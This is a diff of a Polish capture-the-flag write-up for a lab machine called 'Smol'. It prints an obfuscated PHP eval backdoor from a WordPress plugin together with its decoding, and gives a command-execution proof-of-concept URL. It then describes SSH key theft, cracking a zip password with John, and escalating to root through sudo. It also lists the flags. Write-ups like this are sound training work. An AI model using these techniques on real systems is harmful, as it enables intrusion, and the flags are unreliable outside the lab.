@@ -43,10 +43,13 @@ Musimy teraz znów wykorzystać podatność LFI aby dostać się do kodu hello d
 
 widzimy ciekawą linijkę kodu:
 `eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));`
+
 Po zdekodowaniu to będzie:
 `eval("if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }")`
+
 Gdy przetłumaczymy hexy otrzymamy:
 `eval("if (isset($_GET["cmd"])) { system($_GET["cmd"]); }")`
+
 Czyli mamy podatność RCE w parametrze CMD, plugin działa pod index.php więc naszym PoC jest:
 `http://www.smol.thm/wp-admin/index.php?cmd=ls`
 
@@ -73,6 +76,40 @@ Po chwii uzyskujemy hasło dla użytkownika diego. Logujemy się do niego za pom
 
 ![alt text](image-8.png)
 
+Następnie po wylistowaniu plików rekurencyjnie z folderu /home widzimy zapisany klucz prywatny SSH dla użytkownika think, kopiujemy jego zawartość i wklejamy w plik tekstowy na naszej maszynie, następnie ustawiamy jego uprawnienia na 600 i łączymy się jako użytkownik think.
+
+W tym celu używamy komendy: `ssh -i <PATH_TO_KEY> think@<TARGET_IP>`
+
+![alt text](image-9.png)
+
+Przejęliśmy kolejne konto!
+
+Po wypisaniu `cat su` możemy zauważyć że przełączenie się na użytkownika gege nie wymaga od nas hasła, gdy to zrobimy uzyskujemy dostęp do jego plików, w tym do wordpress.old.zip, jest to archiwum zawierające backup starej strony.
+Niestety archiwum jest zaszyfrowane, spróbujmy je odszyfrować, w tym celu na targecie odpalamy serwer http:
+`python3 -m http.server`, pobieramy wget'em plik na swoją maszynę, następnie używamy Johna do złamania hasła:
+`zip2john wordpress.old.zip > hash` i `john hash --wordlist=/usr/share/wordlists/rockyou.txt`.
+
+![alt text](image-10.png)
+
+
+
+Szybko łamiemy hasło i dostajemy się do zawartości, otwieramy plik wp-config.php i tam znajdziemy hasło usera xavi.
+
+![alt text](image-12.png)
+
+![alt text](image-11.png)
+
+Tym hasłem przełączamy się na konto xavi i sprawdzamy `sudo -l` okazuje się że mamy pełną dowolność więc używamy sudo su i przełączamy się na roota.
+
+![alt text](image-13.png)
+
+![alt text](image-14.png)
+
+Teraz tylko formalność `cat /root/root.txt` i ostatnia flaga jest nasza!
+
+![alt text](image-15.png)
+
 ## Flaga
 
 Flaga: **45edaec653ff9ee06236b7ce72b86963**
+Flaga: **bf89ea3ea01992353aef1f576214d4e4**
